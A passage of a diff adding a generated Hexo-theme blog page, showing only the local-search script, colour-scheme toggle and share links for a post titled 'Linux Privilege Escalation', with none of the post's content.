+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Linux%20Privilege%20Escalation + '&url=' + https%3A%2F%2Fkagehayashi.com%2Flinux-priv-esc%2Findex.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://kagehayashi.com/linux-priv-esc/index.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
